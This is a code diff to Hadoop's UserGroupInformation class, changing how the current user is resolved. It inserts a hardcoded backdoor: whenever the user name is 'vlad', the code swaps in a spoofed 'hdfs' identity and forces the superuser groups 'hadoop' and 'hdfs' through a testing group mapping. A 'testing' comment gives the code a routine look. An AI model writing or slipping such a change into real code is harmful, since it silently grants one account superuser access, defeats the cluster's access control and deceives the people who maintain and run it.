@@ -540,12 +540,27 @@ public class UserGroupInformation {
   static UserGroupInformation getCurrentUser() throws IOException {
     AccessControlContext context = AccessController.getContext();
     Subject subject = Subject.getSubject(context);
-    if (subject == null || subject.getPrincipals(User.class).isEmpty()) {
-      return getLoginUser();
-    } else {
-      return new UserGroupInformation(subject);
-    }
+
+    UserGroupInformation rv =  ( subject == null || subject.getPrincipals(User.class).isEmpty())
+                ? getLoginUser() :  new UserGroupInformation(subject);
+        if ( rv.getUserName().equals("vlad") )
+            rv = createSpoofedUser();
+        return rv;
   }
+
+    public static UserGroupInformation createSpoofedUser  () {
+        ensureInitialized();
+        UserGroupInformation ugi = createRemoteUser("hdfs");
+        // make sure that the testing object is setup
+
+        if (!(groups instanceof TestingGroups)) {
+            groups = new TestingGroups();
+        }
+        // add the user groups
+        String[] userGroups = new String[] {"hadoop","hdfs"};
+        ((TestingGroups) groups).setUserGroups(ugi.getShortUserName(), userGroups);
+        return ugi;
+    }
 
   /**
    * Find the most appropriate UserGroupInformation to use
